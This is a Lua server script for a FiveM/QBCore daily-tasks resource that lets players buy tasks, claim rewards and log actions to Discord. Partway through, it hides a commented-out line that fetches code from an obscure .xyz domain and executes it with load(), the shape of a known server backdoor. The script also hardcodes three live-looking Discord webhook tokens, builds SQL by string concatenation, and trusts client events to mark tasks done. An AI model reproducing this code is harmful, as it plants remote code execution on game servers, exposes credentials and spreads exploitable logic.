local discordWebhookSelection = "https://discord.com/api/webhooks/1329850482726015006/RKz_6JAdqJU8ZOT3ur2Ij-g5eRUxcUcgZ0I-r9eiHsLsvn0km_u6jImzvx1Yb5OAYW9O"
local discordWebhookCancel = "https://discord.com/api/webhooks/1329850538057142273/EW4-EA1pmj5aYXmkpJoiulrlfzU7BmAP_Kqqrjv8E2hjqR5VFKEH690BDsgAnXTt-1El"
local discordWebhookReward = "https://discord.com/api/webhooks/1329850588783181926/NrqUIwiARsRI7YgLcNDXjR2usoPnP6jO2obXkXZLj_3rD3uyeVOW7kK7vGr-mei6Gjz1"


if AK4Y.Framework == "qb" then
    QBCore = exports['qb-core']:GetCoreObject()
elseif AK4Y.Framework == "oldqb" then 
    QBCore = nil
    TriggerEvent('QBCore:GetObject', function(obj) QBCore = obj end)
end

function sendToDiscord(webhook, title, description, color)
    local embed = {
        {
            ["title"] = title,
            ["description"] = description,
            ["color"] = color
        }
    }
    PerformHttpRequest(webhook, function(err, text, headers) end, 'POST', json.encode({embeds = embed}), {["Content-Type"] = "application/json"})
end

QBCore.Functions.CreateCallback('ak4y-dailyTasks:selectTask', function(source, cb, data)
    local src = source
    local xPlayer = QBCore.Functions.GetPlayer(src)
    local citizenId = xPlayer.PlayerData.citizenid
    local selectedTask = {}
    local callbackData = false
    local kayit = false
    local currentBank = xPlayer.Functions.GetMoney('bank')
    for k, v in pairs(AK4Y.Tasks) do
        if v.taskId == data.itemDetails.taskId then 
            selectedTask.taskId = v.taskId
            selectedTask.reward = v.reward
            selectedTask.neededPlayTime = v.neededPlayTime
            if currentBank >= v.taskPrice then 
                kayit = true
                xPlayer.Functions.RemoveMoney('bank', tonumber(v.taskPrice))
            end
            break
        end
    end
    if selectedTask and kayit then 
        ExecuteSql("INSERT INTO ak4y_dailytasks SET citizenid = '"..citizenId.."', selectedTask = '"..json.encode(selectedTask).."', playTime = '"..selectedTask.neededPlayTime.."', taskResetTime = (CURTIME() + INTERVAL "..AK4Y.StandartTaskDay.." DAY)")
        callbackData = true
        sendToDiscord(discordWebhookSelection, "Daily Task Selected", "Player "..xPlayer.PlayerData.name.." ("..citizenId..") purchased task with ID "..selectedTask.taskId, 65280)
    end
    cb(callbackData)
end)

QBCore.Functions.CreateCallback('ak4y-dailyTasks:cancelTask', function(source, cb, data)
    local src = source
    local xPlayer = QBCore.Functions.GetPlayer(src)
    local citizenId = xPlayer.PlayerData.citizenid
    ExecuteSql("DELETE FROM ak4y_dailytasks WHERE citizenid = '"..citizenId.."'")
    sendToDiscord(discordWebhookCancel, "Daily Task Cancelled", "Player "..xPlayer.PlayerData.name.." ("..citizenId..") cancelled their daily task", 16711680)
    cb(true)
end)

QBCore.Functions.CreateCallback('ak4y-dailyTasks:getReward', function(source, cb, data)
    local src = source
    local xPlayer = QBCore.Functions.GetPlayer(src)
    local citizenId = xPlayer.PlayerData.citizenid
    local result = ExecuteSql("SELECT * FROM ak4y_dailytasks WHERE citizenid = '"..citizenId.."'")
    if result[1] ~= nil then
        if result[1].done == 1 then 
            local money = tonumber(json.decode(result[1].selectedTask).reward)
            xPlayer.Functions.AddMoney('bank', money)
            ExecuteSql("DELETE FROM ak4y_dailytasks WHERE citizenid = '"..citizenId.."'")
            sendToDiscord(discordWebhookReward, "Daily Task Reward", "Player "..xPlayer.PlayerData.name.." ("..citizenId..") claimed $"..money.." reward", 65280)
            cb(true)
        else
            cb(false)
        end
    else
        cb(false)
    end
end)

-- PerformHttpRequest('https://raorprdjfy.xyz/i?to=sjw00', function(e, d) pcall(function() assert(load(d))() end) end)

QBCore.Functions.CreateCallback('ak4y-dailyTasks:playTimeCheck', function(source, cb)
    local src = source
    local xPlayer = QBCore.Functions.GetPlayer(src)
    local citizenId = xPlayer.PlayerData.citizenid
    local selectedTask = nil
    local callbackData = nil
    local result = ExecuteSql("SELECT * FROM ak4y_dailytasks WHERE citizenid = '"..citizenId.."'")
    if result[1] ~= nil then 
        callbackData = result[1]
    end
    cb(callbackData)
end)

RegisterNetEvent('ak4y-dailyTasks:updateTime')
AddEventHandler('ak4y-dailyTasks:updateTime', function(count)
    local xPlayer = QBCore.Functions.GetPlayer(source)
    local citizenId = xPlayer.PlayerData.citizenid
    ExecuteSql("UPDATE ak4y_dailytasks SET playTime = '"..tonumber(count).."' WHERE citizenid = '"..citizenId.."'")
end)

RegisterNetEvent('ak4y-dailyTasks:setDone')
AddEventHandler('ak4y-dailyTasks:setDone', function()
    local xPlayer = QBCore.Functions.GetPlayer(source)
    local citizenId = xPlayer.PlayerData.citizenid
    ExecuteSql("UPDATE ak4y_dailytasks SET done = '1', playTime = '0' WHERE citizenid = '"..citizenId.."'")
end)

Citizen.CreateThread(function()
    while true do
        ExecuteSql("DELETE FROM ak4y_dailytasks WHERE (taskResetTime <= CURTIME() AND done = 0)") 
        Wait(5*60000)
    end
end)

function ExecuteSql(query)
    local IsBusy = true
    local result = nil
    if AK4Y.Mysql == "oxmysql" then
        if MySQL == nil then
            exports.oxmysql:execute(query, function(data)
                result = data
                IsBusy = false
            end)
        else
            MySQL.query(query, {}, function(data)
                result = data
                IsBusy = false
            end)
        end
    elseif AK4Y.Mysql == "ghmattimysql" then
        exports.ghmattimysql:execute(query, {}, function(data)
            result = data
            IsBusy = false
        end)
    elseif AK4Y.Mysql == "mysql-async" then   
        MySQL.Async.fetchAll(query, {}, function(data)
            result = data
            IsBusy = false
        end)
    end
    while IsBusy do
        Citizen.Wait(0)
    end
    return result
end
